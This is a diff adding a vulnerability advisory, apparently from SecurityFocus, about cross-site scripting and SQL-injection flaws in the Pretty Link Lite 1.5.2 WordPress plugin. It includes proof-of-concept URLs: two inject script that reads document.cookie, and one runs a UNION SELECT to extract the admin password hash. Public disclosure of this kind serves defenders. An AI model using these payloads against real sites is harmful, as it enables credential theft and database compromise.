@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/53531/info
+
+Pretty Link Lite plugin for WordPress is prone to multiple cross-site scripting and SQL-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Pretty Link Lite 1.5.2 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/wp-content/plugins/pretty-link/pretty-bar.php?url="><script>alert(document.cookie);</script>
+
+http://www.example.com/wp-content/plugins/pretty-link/prli-bookmarklet.php?k=c69dbe5f453820a32b0d0b0bb2098d3d&target_url=%23"><script>alert(document.cookie);</script><a name="
+
+http://www.example.com/wp-admin/admin.php?page=pretty-link/prli-clicks.php&action=csv&l=1%20and%201=0%20UNION%20SELECT%20user_pass%20FROM%20wp_users%20WHERE%20ID=1
+
